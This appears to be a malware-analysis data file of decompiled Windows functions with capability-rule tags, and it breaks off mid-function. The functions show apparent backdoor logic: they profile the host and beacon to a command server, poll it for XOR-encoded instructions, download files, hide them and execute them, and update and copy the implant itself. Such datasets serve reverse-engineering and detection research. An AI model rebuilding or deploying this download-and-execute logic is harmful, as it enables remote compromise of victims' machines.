        "decompiled_code": "\nvoid fcn.00406500(void)\n\n{\n    char *pcVar1;\n    char *pcVar2;\n    char cVar3;\n    uint arg_10h;\n    code *pcVar4;\n    char *pcVar5;\n    char *pcVar6;\n    uint uVar7;\n    \n    if (*0x444a85 == '\\0') {\n        fcn.004060f0();\n        *0x444a85 = '\\x01';\n    }\n    pcVar5 = *(*0x444b3c + 0x94);\n    pcVar1 = pcVar5 + 1;\n    do {\n        cVar3 = *pcVar5;\n        pcVar5 = pcVar5 + 1;\n    } while (cVar3 != '\\0');\n    pcVar6 = fcn.00405f40();\n    pcVar2 = pcVar6 + 1;\n    do {\n        cVar3 = *pcVar6;\n        pcVar6 = pcVar6 + 1;\n    } while (cVar3 != '\\0');\n    uVar7 = fcn.0041ff97(pcVar5 + pcVar6 + ((0x20 - pcVar2) - pcVar1));\n    if (*0x444a85 == '\\0') {\n        fcn.004060f0();\n        *0x444a85 = '\\x01';\n    }\n    arg_10h = *(*0x444b3c + 0x94);\n    fcn.00405f40();\n    fcn.00420bd5(uVar7, \"%s?comp=%s\", arg_10h);\n    pcVar4 = _sym.imp.KERNEL32.DLL_Sleep;\n    do {\n        uVar7 = fcn.004015f0();\n        fcn.00404300();\n        fcn.00420c59(uVar7);\n        (*pcVar4)(300000);\n    } while( true );\n}\n",
        "token_count": 419
    },
    "004065c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004065c0(void)\n\n{\n    char cVar1;\n    uint arg_10h;\n    code *pcVar2;\n    uint uVar3;\n    char *pcVar4;\n    char *pcVar5;\n    uint uVar6;\n    char *pcVar7;\n    int32_t iVar8;\n    char *pcVar9;\n    uint uVar10;\n    int32_t iVar11;\n    int32_t iVar12;\n    int32_t unaff_EBX;\n    float10 fVar13;\n    float fStack24;\n    char *pcStack20;\n    double dStack16;\n    \n    do {\n        uVar3 = fcn.004015f0();\n        if (*0x444a85 == '\\0') {\n            fcn.004060f0();\n            *0x444a85 = '\\x01';\n        }\n        pcVar4 = (*0x444b3c)[0x25];\n        pcVar7 = pcVar4 + 1;\n        do {\n            cVar1 = *pcVar4;\n            pcVar4 = pcVar4 + 1;\n        } while (cVar1 != '\\0');\n        pcVar5 = fcn.00405f40();\n        pcVar9 = pcVar5 + 1;\n        do {\n            cVar1 = *pcVar5;\n            pcVar5 = pcVar5 + 1;\n        } while (cVar1 != '\\0');\n        uVar6 = fcn.0041ff97(pcVar4 + pcVar5 + ((0x40 - pcVar9) - pcVar7));\n        if (*0x444a85 == '\\0') {\n            fcn.004060f0();\n            *0x444a85 = '\\x01';\n        }\n        uVar10 = (*0x444b3c)[0x25];\n        fcn.00405f40();\n        fcn.00420bd5(uVar6, \"%s?mews_cnt&comp=%s\", uVar10);\n        pcVar7 = fcn.00404300();\n        while (pcVar7 == NULL) {\n            (*_sym.imp.KERNEL32.DLL_Sleep)(30000);\n            pcVar7 = fcn.00404300();\n        }\n        if (*0x444a85 == '\\0') {\n            fcn.004060f0();\n            *0x444a85 = '\\x01';\n        }\n        pcStack20 = (*0x444b3c)[2];\n        pcVar4 = pcStack20 + 1;\n        do {\n            cVar1 = *pcStack20;\n            pcStack20 = pcStack20 + 1;\n        } while (cVar1 != '\\0');\n        pcStack20 = pcStack20 - pcVar4;\n        pcVar4 = pcVar7;\n        do {\n            cVar1 = *pcVar4;\n            pcVar4 = pcVar4 + 1;\n        } while (cVar1 != '\\0');\n        if (*0x444a85 == '\\0') {\n            fcn.004060f0();\n            *0x444a85 = '\\x01';\n        }\n        iVar11 = (*0x444b3c)[2];\n        iVar8 = 0;\n        iVar12 = 0;\n        if (0 < pcVar4 - (pcVar7 + 1)) {\n            do {\n                if (pcStack20 <= iVar12) {\n                    iVar12 = 0;\n                }\n                pcVar7[iVar8] = pcVar7[iVar8] ^ -*(iVar12 + iVar11);\n                iVar8 = iVar8 + 1;\n                iVar12 = iVar12 + 1;\n            } while (iVar8 < pcVar4 - (pcVar7 + 1));\n        }\n        fStack24 = 0.0;\n        fcn.00422b02(pcVar7, 0x43d960, &fStack24);\n        if (*0x444a85 == '\\0') {\n            fcn.004060f0();\n            *0x444a85 = '\\x01';\n        }\n        dStack16 = fStack24;\n        fVar13 = fcn.00422fdf(**0x444b3c);\n        pcStack20 = fVar13;\n        if (pcStack20 < dStack16) {\n            pcVar9 = fcn.00401120();\n            pcVar4 = pcVar9;\n            do {\n                cVar1 = *pcVar4;\n                pcVar4 = pcVar4 + 1;\n            } while (cVar1 != '\\0');\n            pcStack20 = pcVar9;\n            uVar10 = fcn.0041ff97(pcVar4 + (0x10 - (pcVar9 + 1)));\n            fcn.00420bd5(uVar10, \"%s_u.exe\", pcVar9);\n            if (*0x444a85 == '\\0') {\n                fcn.004060f0();\n                *0x444a85 = '\\x01';\n            }\n            arg_10h = (*0x444b3c)[0x25];\n            fcn.00405f40();\n            fcn.00420bd5(uVar6, \"%s?news_client&comp=%s\", arg_10h);\n            iVar11 = (*_sym.imp.SHLWAPI.dll_PathFileExistsA)(uVar10);\n            if (iVar11 != 0) {\n                (*_sym.imp.KERNEL32.DLL_SetFileAttributesA)(uVar10, 0x80);\n            }\n            iVar11 = fcn.00404510(uVar6);\n            if (iVar11 != 0) {\n                if (*0x444a85 == '\\0') {\n                    fcn.004060f0();\n                    *0x444a85 = '\\x01';\n                }\n                pcVar9 = (*0x444b3c)[2];\n                pcVar4 = pcVar9 + 1;\n                do {\n                    cVar1 = *pcVar9;\n                    pcVar9 = pcVar9 + 1;\n                } while (cVar1 != '\\0');\n                if (*0x444a85 == '\\0') {\n                    fcn.004060f0();\n                    *0x444a85 = '\\x01';\n                }\n                fcn.00406000(uVar10, (*0x444b3c)[2], pcVar9 - pcVar4);\n                fcn.004049c0(uVar10);\n                fcn.00401fe0(uVar10);\n                uVar3 = 6;\n                (*_sym.imp.KERNEL32.DLL_SetFileAttributesA)(uVar10, 6);\n                if (*0x444a88 != 0) {\n                    (*_sym.imp.KERNEL32.DLL_CloseHandle)(*0x444a88);\n                }\n                if (unaff_EBX != 0) {\n                    fcn.00420c59(unaff_EBX);\n                }\n                uVar6 = 5;\n                (*_sym.imp.SHELL32.dll_ShellExecuteA)(0, \"open\", uVar10, 0x43c488, 0, 5);\n                fcn.00420c59(uVar3);\n                fcn.00420c59(uVar10);\n                fcn.00420c59(unaff_EBX);\n                fcn.00420c59(pcVar7);\n                fcn.00420c59(uVar6);\n                fcn.00423277(0);\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n            fcn.00420c59(pcStack20);\n            fcn.00420c59(uVar10);\n        }\n        fcn.00420c59(uVar3);\n        fcn.00420c59(pcVar7);\n        fcn.00420c59(uVar6);\n        (*_sym.imp.KERNEL32.DLL_Sleep)(300000);\n    } while( true );\n}\n",
        "token_count": 1721
    },
    "00406940": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00406940(void)\n\n{\n    char *pcVar1;\n    char cVar2;\n    code *pcVar3;\n    char *pcVar4;\n    char *pcVar5;\n    char *pcVar6;\n    char *pcVar7;\n    char *pcVar8;\n    char *pcVar9;\n    uint arg_8h;\n    uint uVar10;\n    int32_t iVar11;\n    uint unaff_EDI;\n    float10 fVar12;\n    uchar auStack436 [28];\n    float fStack408;\n    uchar auStack400 [4];\n    uint16_t uStack396;\n    uint16_t auStack380 [10];\n    uchar auStack360 [20];\n    char acStack340 [272];\n    uint32_t uStack68;\n    \n    uStack68 = *0x441480 ^ auStack436;\n    (*_sym.imp.KERNEL32.DLL_GlobalMemoryStatus)(auStack360);\n    fcn.00405270();\n    (*_sym.imp.KERNEL32.DLL_GetSystemTime)(auStack380);\n    (*_sym.imp.KERNEL32.DLL_GetLocalTime)(auStack400);\n    pcVar4 = fcn.00420d1e(\"USERNAME\");\n    pcVar8 = pcVar4 + 1;\n    do {\n        cVar2 = *pcVar4;\n        pcVar4 = pcVar4 + 1;\n    } while (cVar2 != '\\0');\n    fStack408 = pcVar4 - pcVar8;\n    pcVar4 = fcn.00420d1e(\"USERDOMAIN\");\n    pcVar8 = pcVar4 + 1;\n    do {\n        cVar2 = *pcVar4;\n        pcVar4 = pcVar4 + 1;\n    } while (cVar2 != '\\0');\n    pcVar5 = acStack340;\n    do {\n        cVar2 = *pcVar5;\n        pcVar5 = pcVar5 + 1;\n    } while (cVar2 != '\\0');\n    pcVar6 = fcn.00420d1e(\"NUMBER_OF_PROCESSORS\");\n    pcVar1 = pcVar6 + 1;\n    do {\n        cVar2 = *pcVar6;\n        pcVar6 = pcVar6 + 1;\n    } while (cVar2 != '\\0');\n    pcVar7 = fcn.00420d1e(\"PROCESSOR_ARCHITECTURE\");\n    pcVar9 = pcVar7 + 1;\n    do {\n        cVar2 = *pcVar7;\n        pcVar7 = pcVar7 + 1;\n    } while (cVar2 != '\\0');\n    pcVar8 = fcn.0041ff97(pcVar4 + pcVar5 + pcVar6 + pcVar7 + fStack408 +\n                                                              (((-pcVar9 - pcVar1) - (acStack340 + 1)) - pcVar8) + 0x80)\n    ;\n    fcn.00420d1e(\"PROCESSOR_ARCHITECTURE\");\n    fcn.00420d1e(\"NUMBER_OF_PROCESSORS\");\n    fcn.00420d1e(\"USERDOMAIN\");\n    fcn.00420d1e(\"USERNAME\");\n    fcn.00420bd5(pcVar8, \"(GMT %c%i; %i.%i.%i at %i:%i:%i); %s@%s; %s; %s %s processor(s); %i MB RAM\", \n                 (uStack396 - auStack380[0] < 0) * 2 + 0x2b);\n    if (*0x444a85 == '\\0') {\n        fcn.004060f0();\n        *0x444a85 = '\\x01';\n    }\n    pcVar5 = (*0x444b3c)[0x25];\n    pcVar4 = pcVar5 + 1;\n    do {\n        cVar2 = *pcVar5;\n        pcVar5 = pcVar5 + 1;\n    } while (cVar2 != '\\0');\n    pcVar6 = fcn.00405f40();\n    pcVar1 = pcVar6 + 1;\n    do {\n        cVar2 = *pcVar6;\n        pcVar6 = pcVar6 + 1;\n    } while (cVar2 != '\\0');\n    pcVar9 = pcVar8;\n    do {\n        cVar2 = *pcVar9;\n        pcVar9 = pcVar9 + 1;\n    } while (cVar2 != '\\0');\n    arg_8h = fcn.0041ff97(pcVar5 + pcVar6 + pcVar9 + (((-(pcVar8 + 1) - pcVar1) + 0x80) - pcVar4));\n    if (*0x444a85 == '\\0') {\n        fcn.004060f0();\n        *0x444a85 = '\\x01';\n    }\n    fStack408 = **0x444b3c;\n    if (*0x444a85 == '\\0') {\n        fcn.004060f0();\n        *0x444a85 = '\\x01';\n    }\n    uVar10 = (*0x444b3c)[0x25];\n    fcn.00405f40(pcVar8);\n    fVar12 = fcn.00422fdf(fStack408);\n    fStack408 = fVar12;\n    fcn.00420bd5(arg_8h, \"%s?reg&ver=%.1f&comp=%s&addinfo=%s\", uVar10);\n    fcn.00420c59(pcVar8);\n    uVar10 = fcn.004015f0();\n    iVar11 = fcn.00404300();\n    pcVar3 = _sym.imp.KERNEL32.DLL_Sleep;\n    while (iVar11 == 0) {\n        (*pcVar3)(30000);\n        iVar11 = fcn.00404300();\n    }\n    fcn.00420c59(arg_8h);\n    fcn.00420c59(uVar10);\n    fcn.00420bc6(unaff_EDI);\n    return;\n}\n",
        "token_count": 1331
    },
    "00406bf0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00406bf0(void)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    uint arg_10h;\n    code *pcVar3;\n    uint32_t uVar4;\n    char *pcVar5;\n    char *pcVar6;\n    uint uVar7;\n    char *pcVar8;\n    char *pcVar9;\n    int32_t iVar10;\n    int32_t iVar11;\n    uint32_t *puVar12;\n    uint8_t *puVar13;\n    char *pcVar14;\n    uint uVar15;\n    int32_t iVar16;\n    uint8_t *puVar17;\n    uint32_t uVar18;\n    uint8_t uVar19;\n    uint32_t uVar20;\n    uint32_t uVar21;\n    int32_t **in_FS_OFFSET;\n    bool bVar22;\n    uchar auStack628 [3];\n    char cStack625;\n    uint32_t uStack624;\n    uint32_t *puStack620;\n    uint32_t *puStack616;\n    uint32_t *puStack612;\n    uint32_t *puStack608;\n    char *pcStack600;\n    uint uStack596;\n    uint uStack592;\n    char *pcStack588;\n    uint32_t auStack584 [9];\n    uint8_t auStack548 [260];\n    char acStack288 [260];\n    uint32_t uStack28;\n    int32_t *piStack20;\n    uint uStack16;\n    uint uStack12;\n    \n    uStack12 = 0xffffffff;\n    uStack16 = 0x437f6b;\n    piStack20 = *in_FS_OFFSET;\n    uStack28 = *0x441480 ^ auStack628;\n    uVar4 = *0x441480 ^ &stack0xfffffd80;\n    *in_FS_OFFSET = &piStack20;\n    do {\n        uStack596 = fcn.004015f0(uVar4);\n        if (*0x444a85 == '\\0') {\n            fcn.004060f0();\n            *0x444a85 = '\\x01';\n        }\n        pcVar5 = *(*0x444b3c + 0x94);\n        pcVar8 = pcVar5 + 1;\n        do {\n            cVar1 = *pcVar5;\n            pcVar5 = pcVar5 + 1;\n        } while (cVar1 != '\\0');\n        pcVar6 = fcn.00405f40();\n        pcVar9 = pcVar6 + 1;\n        do {\n            cVar1 = *pcVar6;\n            pcVar6 = pcVar6 + 1;\n        } while (cVar1 != '\\0');\n        uVar7 = fcn.0041ff97(pcVar5 + pcVar6 + ((0x40 - pcVar9) - pcVar8));\n        if (*0x444a85 == '\\0') {\n            fcn.004060f0();\n            *0x444a85 = '\\x01';\n        }\n        uVar15 = *(*0x444b3c + 0x94);\n        fcn.00405f40();\n        fcn.00420bd5(uVar7, \"%s?news_stream&comp=%s\", uVar15);\n        pcVar8 = fcn.00404300();\n        pcVar3 = _sym.imp.KERNEL32.DLL_Sleep;\n        while (pcStack600 = pcVar8,  pcVar8 == NULL) {\n            (*pcVar3)(30000);\n            pcVar8 = fcn.00404300();\n        }\n        fcn.00420c59(uVar7);\n        if (*0x444a85 == '\\0') {\n            fcn.004060f0();\n            *0x444a85 = '\\x01';\n        }\n        pcVar9 = *(*0x444b3c + 8);\n        pcVar5 = pcVar9 + 1;\n        do {\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar9 + 1;\n        } while (cVar1 != '\\0');\n        uStack624 = pcVar9 - pcVar5;\n        pcVar5 = pcVar8;\n        do {\n            cVar1 = *pcVar5;\n            pcVar5 = pcVar5 + 1;\n        } while (cVar1 != '\\0');\n        if (*0x444a85 == '\\0') {\n            fcn.004060f0();\n            *0x444a85 = '\\x01';\n        }\n        iVar11 = *(*0x444b3c + 8);\n        iVar10 = 0;\n        iVar16 = 0;\n        if (0 < pcVar5 - (pcVar8 + 1)) {\n            do {\n                if (uStack624 <= iVar16) {\n                    iVar16 = 0;\n                }\n                pcVar8[iVar10] = pcVar8[iVar10] ^ -*(iVar16 + iVar11);\n                iVar10 = iVar10 + 1;\n                iVar16 = iVar16 + 1;\n            } while (iVar10 < pcVar5 - (pcVar8 + 1));\n        }\n        puStack616 = NULL;\n        puStack612 = NULL;\n        puStack608 = NULL;\n        uStack12 = 0;\n        puStack620 = NULL;\ncode_r0x00406da0:\n        acStack288[0] = '\\0';\n        cStack625 = '\\0';\n        pcVar8 = pcStack600;\n        do {\n            cVar1 = *pcVar8;\n            pcVar8 = pcVar8 + 1;\n        } while (cVar1 != '\\0');\n        iVar11 = pcVar8 - (pcStack600 + 1);\n        iVar10 = 0;\n        puVar12 = puStack620;\n        if (puStack620 < iVar11) {\n            do {\n                cVar1 = *(puVar12 + pcStack600);\n                if (cStack625 != '\\0') {\n                    if (cVar1 == '\\\"') goto code_r0x00406ed3;\n                    acStack288[iVar10] = cVar1;\n                    iVar10 = iVar10 + 1;\n                    if (iVar11 + -1 <= puVar12) goto code_r0x00406ecb;\n                }\n                if (cVar1 == '\\\"') {\n                    cStack625 = '\\x01';\n                }\n                puVar12 = puVar12 + 1;\n                if (iVar11 <= puVar12) break;\n            } while( true );\n        }\n        pcVar5 = fcn.00401330();\n        pcVar8 = pcVar5;\n        do {\n            cVar1 = *pcVar8;\n            pcVar8 = pcVar8 + 1;\n        } while (cVar1 != '\\0');\n        pcStack588 = pcVar5;\n        uVar7 = fcn.0041ff97(pcVar8 + (8 - (pcVar5 + 1)));\n        uStack592 = uVar7;\n        fcn.00420bd5(uVar7, \"%s\\\\*\", pcVar5);\n        puStack620 = fcn.00422c32(uVar7, auStack584);\n        if ((puStack620 != NULL) && (puStack620 != 0xffffffff)) {\n            uStack624 = puStack612 - puStack616 >> 2;\n            do {\n                uVar20 = 0;\n                uVar19 = 1;\n                if (uStack624 != 0) {\n                    do {\n                        puVar13 = puStack616[uVar20];\n                        puVar17 = auStack548;\n                        do {\n                            uVar2 = *puVar13;\n                            bVar22 = uVar2 < *puVar17;\n                            if (uVar2 != *puVar17) {\ncode_r0x004071df:\n                                iVar11 = (1 - bVar22) - (bVar22 != 0);\n                                goto code_r0x004071e4;\n                            }\n                            if (uVar2 == 0) break;\n                            uVar2 = puVar13[1];\n                            bVar22 = uVar2 < puVar17[1];\n                            if (uVar2 != puVar17[1]) goto code_r0x004071df;\n                            puVar13 = puVar13 + 2;\n                            puVar17 = puVar17 + 2;\n                        } while (uVar2 != 0);\n                        iVar11 = 0;\ncode_r0x004071e4:\n                        if (iVar11 == 0) {\n                            uVar19 = 0;\n                        }\n                        uVar20 = uVar20 + 1;\n                    } while (uVar20 < uStack624);\n                }\n                if ((uVar19 & ~(auStack584[0] >> 4)) != 0) {\n                    iVar11 = (*_sym.imp.KERNEL32.DLL_CreateToolhelp32Snapshot)(2, 0);\n                    if (iVar11 != 0) {\n                        fcn.004054a0(auStack548);\n                    }\n                    pcVar8 = pcVar5;\n                    do {\n                        cVar1 = *pcVar8;\n                        pcVar8 = pcVar8 + 1;\n                    } while (cVar1 != '\\0');\n                    puVar17 = auStack548;\n                    do {\n                        uVar19 = *puVar17;\n                        puVar17 = puVar17 + 1;\n                    } while (uVar19 != 0);\n                    uVar7 = fcn.0041ff97(puVar17 + pcVar8 + ((8 - (pcVar5 + 1)) - (auStack548 + 1)));\n                    fcn.00420bd5(uVar7, 0x43c26c, pcVar5);\n                    fcn.004227e9(uVar7);\n                    fcn.00420c59(uVar7);\n                }\n                iVar11 = puStack620;\n                iVar10 = fcn.00422d59(puStack620, auStack584);\n            } while (iVar10 == 0);\n            fcn.00422e87(iVar11);\n        }\n        puVar12 = puStack616;\n        uVar20 = puStack612 - puStack616 >> 2;\n        uVar21 = 0;\n        if (uVar20 != 0) {\n            do {\n                if (puVar12[uVar21] != 0) {\n                    fcn.00420c59(puVar12[uVar21]);\n                }\n                uVar21 = uVar21 + 1;\n            } while (uVar21 < uVar20);\n        }\n        if (puVar12 != puStack612) {\n            fcn.00421190(puVar12, puStack612, 0);\n        }\n        fcn.00420c59(uStack592);\n        fcn.00420c59(pcStack588);\n        fcn.00420c59(pcStack600);\n        fcn.00420c59(uStack596);\n        (*_sym.imp.KERNEL32.DLL_Sleep)(300000);\n        uStack12 = 0xffffffff;\n        if (puVar12 != NULL) {\n            fcn.004220e7(puVar12);\n        }\n    } while( true );\ncode_r0x00406ecb:\n    if (iVar10 < 0x100) {\ncode_r0x00406ed3:\n        acStack288[iVar10] = '\\0';\n    }\n    puStack620 = puVar12 + 1;\n    pcVar8 = acStack288;\n    do {\n        cVar1 = *pcVar8;\n        pcVar8 = pcVar8 + 1;\n    } while (cVar1 != '\\0');\n    uVar20 = fcn.0041ff97(pcVar8 + (8 - (acStack288 + 1)));\n    pcVar8 = acStack288;\n    iVar11 = uVar20 - pcVar8;\n    do {\n        cVar1 = *pcVar8;\n        pcVar8[iVar11] = cVar1;\n        pcVar8 = pcVar8 + 1;\n    } while (cVar1 != '\\0');\n    uStack624 = uVar20;\n    if ((&uStack624 < puStack612) && (puStack616 <= &uStack624)) {\n        iVar11 = &uStack624 - puStack616;\n        puVar12 = puStack616;\n        if (puStack612 == puStack608) {\n            uVar20 = puStack612 - puStack616 >> 2;\n            if (0x3ffffffe < uVar20) {\ncode_r0x00407340:\n                fcn.00420641(\"vector<T> too long\");\n                pcVar3 = swi(3);\n                (*pcVar3)();\n                return;\n            }\n            uVar20 = uVar20 + 1;\n            uVar21 = puStack608 - puStack616 >> 2;\n            if (uVar21 < uVar20) {\n                if (0x3fffffff - (uVar21 >> 1) < uVar21) {\n                    uVar21 = 0;\n                }\n                else {\n                    uVar21 = uVar21 + (uVar21 >> 1);\n                }\n                if (uVar21 < uVar20) {\n                    uVar21 = uVar20;\n                }\n                fcn.00406280(uVar21);\n                puVar12 = puStack620;\n                puStack612 = puStack616;\n            }\n        }\n        if (puStack612 != NULL) {\n            *puStack612 = puVar12[iVar11 >> 2];\n        }\n    }\n    else {\n        if (puStack612 == puStack608) {\n            uVar21 = puStack612 - puStack616 >> 2;\n            if (0x3ffffffe < uVar21) goto code_r0x00407340;\n            uVar21 = uVar21 + 1;\n            uVar18 = puStack608 - puStack616 >> 2;\n            if (uVar18 < uVar21) {\n                if (0x3fffffff - (uVar18 >> 1) < uVar18) {\n                    uVar18 = 0;\n                }\n                else {\n                    uVar18 = uVar18 + (uVar18 >> 1);\n                }\n                if (uVar18 < uVar21) {\n                    uVar18 = uVar21;\n                }\n                fcn.00406280(uVar18);\n                puStack612 = puStack616;\n            }\n        }\n        if (puStack612 != NULL) {\n            *puStack612 = uVar20;\n        }\n    }\n    puStack612 = puStack612 + 1;\n    pcVar5 = fcn.00401330();\n    pcVar8 = pcVar5;\n    do {\n        cVar1 = *pcVar8;\n        pcVar8 = pcVar8 + 1;\n    } while (cVar1 != '\\0');\n    pcVar9 = acStack288;\n    do {\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar9 + 1;\n    } while (cVar1 != '\\0');\n    uVar7 = fcn.0041ff97(pcVar8 + pcVar9 + ((8 - (acStack288 + 1)) - (pcVar5 + 1)));\n    fcn.00420bd5(uVar7, 0x43c26c, pcVar5);\n    fcn.00420c59(pcVar5);\n    iVar11 = (*_sym.imp.SHLWAPI.dll_PathFileExistsA)(uVar7);\n    if (iVar11 == 0) {\n        if (*0x444a85 == '\\0') {\n            fcn.004060f0();\n            *0x444a85 = '\\x01';\n        }\n        pcVar5 = *(*0x444b3c + 0x94);\n        pcVar8 = pcVar5 + 1;\n        do {\n            cVar1 = *pcVar5;\n            pcVar5 = pcVar5 + 1;\n        } while (cVar1 != '\\0');\n        pcVar9 = acStack288;\n        do {\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar9 + 1;\n        } while (cVar1 != '\\0');\n        pcVar14 = fcn.00405f40();\n        pcVar6 = pcVar14 + 1;\n        do {\n            cVar1 = *pcVar14;\n            pcVar14 = pcVar14 + 1;\n        } while (cVar1 != '\\0');\n        uVar15 = fcn.0041ff97(pcVar5 + pcVar9 + pcVar14 + (((-pcVar6 - (acStack288 + 1)) + 0x10) - pcVar8));\n        if (*0x444a85 == '\\0') {\n            fcn.004060f0();\n            *0x444a85 = '\\x01';\n        }\n        arg_10h = *(*0x444b3c + 0x94);\n        fcn.00405f40();\n        fcn.00420bd5(uVar15, \"%s?news_item=%s&comp=%s\", arg_10h);\n        iVar11 = fcn.00404510(uVar15);\n        if (iVar11 != 0) {\n            if (*0x444a85 == '\\0') {\n                fcn.004060f0();\n                *0x444a85 = '\\x01';\n            }\n            pcVar5 = *(*0x444b3c + 8);\n            pcVar8 = pcVar5 + 1;\n            do {\n                cVar1 = *pcVar5;\n                pcVar5 = pcVar5 + 1;\n            } while (cVar1 != '\\0');\n            if (*0x444a85 == '\\0') {\n                fcn.004060f0();\n                *0x444a85 = '\\x01';\n            }\n            fcn.00406000(uVar7, *(*0x444b3c + 8), pcVar5 - pcVar8);\n            fcn.004049c0(uVar7);\n            fcn.00401fe0(uVar7);\n            (*_sym.imp.KERNEL32.DLL_SetFileAttributesA)(uVar7, 6);\n            iVar11 = fcn.00422b30(uVar7, \".exe\");\n            if (iVar11 == 0) {\n                iVar11 = fcn.00422b30(uVar7, \".dll\");\n                if (iVar11 != 0) {\n                    (*_sym.imp.KERNEL32.DLL_LoadLibraryA)(uVar7);\n                }\n            }\n            else {\n                (*_sym.imp.SHELL32.dll_ShellExecuteA)(0, \"open\", uVar7, 0x43c488, 0, 5);\n            }\n        }\n        fcn.00420c59(uVar15);\n        fcn.00420c59(uVar7);\n    }\n    goto code_r0x00406da0;\n}\n",
        "token_count": 4140
    },
    "00407350": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00407350(void)\n\n{\n    char *pcVar1;\n    char *pcVar2;\n    char cVar3;\n    char *pcVar4;\n    char *pcVar5;\n    char *pcVar6;\n    char *pcVar7;\n    int32_t iVar8;\n    uint uVar9;\n    ushort *arg_8h;\n    char *pcVar10;\n    int32_t iVar11;\n    int32_t iVar12;\n    char *unaff_EDI;\n    uint uStack380;\n    uint uStack376;\n    uchar auStack372 [80];\n    char acStack292 [12];\n    uchar auStack280 [268];\n    uint32_t uStack12;\n    \n    uStack12 = *0x441480 ^ &uStack380;\n    (*_sym.imp.KERNEL32.DLL_GetModuleFileNameA)(0, auStack280, 0x104);\n    if (*0x444a85 == '\\0') {\n        fcn.004060f0();\n        *0x444a85 = '\\x01';\n    }\n    cVar3 = fcn.00404cb0(*(*0x444b3c + 0x98));\n    if (cVar3 != '\\0') {\n        pcVar4 = fcn.00420d1e(\"TEMP\");\n        unaff_EDI = pcVar4;\n        pcVar5 = fcn.004020c0();\n        pcVar6 = acStack292;\n        do {\n            cVar3 = *pcVar6;\n            pcVar6 = pcVar6 + 1;\n        } while (cVar3 != '\\0');\n        if (*0x444a85 == '\\0') {\n            fcn.004060f0();\n            *0x444a85 = '\\x01';\n        }\n        pcVar7 = *(*0x444b3c + 0x9c);\n        pcVar10 = pcVar7 + 1;\n        do {\n            cVar3 = *pcVar7;\n            pcVar7 = pcVar7 + 1;\n        } while (cVar3 != '\\0');\n        pcVar1 = pcVar4 + 1;\n        do {\n            cVar3 = *pcVar4;\n            pcVar4 = pcVar4 + 1;\n        } while (cVar3 != '\\0');\n        pcVar2 = pcVar5 + 1;\n        do {\n            cVar3 = *pcVar5;\n            pcVar5 = pcVar5 + 1;\n        } while (cVar3 != '\\0');\n        pcVar6 = fcn.0041ff97(pcVar6 + pcVar7 + pcVar4 + pcVar5 + ((((-pcVar2 - pcVar1) - pcVar10) + 8) -\n                                                                  (acStack292 + 1)));\n        if (*0x444a85 == '\\0') {\n            fcn.004060f0();\n            *0x444a85 = '\\x01';\n        }\n        fcn.00420bd5(pcVar6, \"%s_%s.exe\", acStack292);\n        iVar8 = fcn.00421d73(pcVar6, 0x43daa4);\n        if (iVar8 == 0) {\n            iVar8 = (*_sym.imp.SHLWAPI.dll_PathFileExistsA)(pcVar6);\n            if (iVar8 == 0) {\n                fcn.00420bd5(pcVar6, 0x43c26c, unaff_EDI);\n            }\n        }\n        else {\n            fcn.004226f5(iVar8);\n        }\n        if (*0x444a85 == '\\0') {\n            fcn.004060f0();\n            *0x444a85 = '\\x01';\n        }\n        fcn.00404f80(pcVar6, 0);\n        (*_sym.imp.KERNEL32.DLL_SetFileAttributesA)(pcVar6, 6);\n        uVar9 = fcn.00422819(1);\n        arg_8h = fcn.004228ad(uVar9, 2);\n        *arg_8h = 0x22;\n        pcVar4 = pcVar6 + 1;\n        pcVar5 = pcVar6;\n        do {\n            cVar3 = *pcVar5;\n            pcVar5 = pcVar5 + 1;\n        } while (cVar3 != '\\0');\n        pcVar10 = pcVar5 + (1 - pcVar4);\n        iVar8 = fcn.004228ad(arg_8h, pcVar5 + (2 - pcVar4));\n        iVar11 = 1;\n        if (1 < pcVar10) {\n            do {\n                *(iVar11 + iVar8) = pcVar6[iVar11 + -1];\n                iVar11 = iVar11 + 1;\n            } while (iVar11 < pcVar10);\n        }\n        pcVar10[iVar8] = '\\0';\n        iVar8 = fcn.004228ad(iVar8, pcVar5 + (4 - pcVar4));\n        pcVar5 = pcVar5 + (3 - pcVar4);\n        if (pcVar10 < pcVar5) {\n            iVar11 = 0x43daa8 - pcVar10;\n            do {\n                pcVar10[iVar8] = pcVar10[iVar11];\n                pcVar10 = pcVar10 + 1;\n            } while (pcVar10 < pcVar5);\n        }\n        pcVar5[iVar8] = '\\0';\n        iVar11 = 1;\n        if (1 < *0x443cd0) {\n            do {\n                pcVar6 = unaff_EDI;\n                iVar8 = fcn.004228ad(iVar8, pcVar5 + 2);\n                pcVar4 = pcVar5 + 1;\n                if (pcVar5 < pcVar4) {\n                    iVar12 = 0x43c654 - pcVar5;\n                    do {\n                        pcVar5[iVar8] = pcVar5[iVar12];\n                        pcVar5 = pcVar5 + 1;\n                    } while (pcVar5 < pcVar4);\n                }\n                iVar12 = *0x443cd4;\n                pcVar4[iVar8] = '\\0';\n                pcVar5 = *(iVar12 + iVar11 * 4);\n                pcVar10 = pcVar5;\n                do {\n                    cVar3 = *pcVar10;\n                    pcVar10 = pcVar10 + 1;\n                } while 